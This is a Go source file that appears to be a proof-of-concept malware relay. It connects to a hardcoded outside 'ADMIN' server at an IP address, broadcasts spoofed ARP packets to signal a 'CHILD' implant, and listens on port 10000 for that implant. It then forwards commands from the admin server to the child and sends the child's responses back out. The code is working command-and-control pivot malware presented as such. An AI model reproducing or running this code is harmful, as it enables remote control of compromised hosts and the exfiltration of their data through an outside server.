package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"runtime"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	// "/Blog/POC_Malwarez/arp_connect_main/ARP"
)

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

var (
	device       string = "\\Device\\NPF_{82C04DE8-DF7E-479E-A616-7F3F94DA089A}"
	snapshot_len int32  = 1024
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = 30 * time.Second
	handle       *pcap.Handle
	buffer       gopacket.SerializeBuffer
	// options      gopacket.SerializeOptions
)

func ARP() {
	// ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
		return
	}
	// fmt.Println(ifaces)
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Send raw bytes over wire
	rawBytes := []byte{10, 20, 30}
	err = handle.WritePacketData(rawBytes)
	if err != nil {
		log.Fatal(err)
	}

	// This time lets fill out some information
	// ipLayer := layers.IPv4{
	// 	SrcIP: net.IP{192, 168, 50, 209},
	// 	DstIP: net.IP{192, 168, 50, 5},
	// }
	arpLayer := layers.ARP{
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   6,
		ProtAddressSize: 4,
		Operation:       layers.ARPRequest,
		SourceHwAddress: []byte(net.HardwareAddr{0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA}),
		// SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte{172, 16, 2, 15},
		DstHwAddress:      []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		DstProtAddress:    []byte{172, 16, 2, 15},
	}
	ethernetLayer := layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0xBB, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB},
		DstMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // for arp broadcast
		EthernetType: layers.EthernetTypeARP,
	}
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	// tcpLayer := layers.TCP{
	// 	SrcPort: layers.TCPPort(9999),
	// 	DstPort: layers.TCPPort(9999),
	// }
	// And create the packet with the layers
	buffer = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		&ethernetLayer,
		// &ipLayer,
		// &tcpLayer,
		&arpLayer,
		gopacket.Payload(rawBytes),
	)
	fmt.Println("sending ARP traffic for Child to connect")
	fmt.Println("STAIC MAC ADDRESS: ", ethernetLayer.SrcMAC)
	outgoingPacket := buffer.Bytes()
	// fmt.Println(outgoingPacket)
	// outgoingPacket := buffer.Bytes()
	// Send our packet

	for x := 1; x < 5; x++ {
		// fmt.Println("Sending Packet")
		err = handle.WritePacketData(outgoingPacket)
		if err != nil {
			log.Fatal(err)
		}
	}
}

// ===========IF NOT ADMIN YOU CANNOT SEND ARP PACKETS =====
func main() {

	// //manual connection to ADMIN server
	// arguments := os.Args
	// if len(arguments) == 1 {
	// 	fmt.Println("Please provide host:port.")
	// 	return
	// }

	// CONNECT := arguments[1]
	CONNECT := "3.21.234.14:9999"
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
	// this may need to be a go routine
	defer c.Close()
	//======

	fmt.Println("CREATING SERVER FOR CHILD")
	PORT := ":10000"
	l2, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l2.Close()

	//attemping ARP
	ARP() // Need to play in a GO routine so it can run while listening for connection

	//CONNECTION TO CHILD MALWARE

	//server connection for child to connect to.
	//connection on port 10000
	fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else {
		fmt.Println("CHILD connected on", PORT)
	}
	// fmt.Println("server establed on", PORT)

	//server connection for child to connect to.
	//connection on port 10000

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Closing TCP server!")
			return
		}
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}

		// s := string(buf[:len])

		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}

}
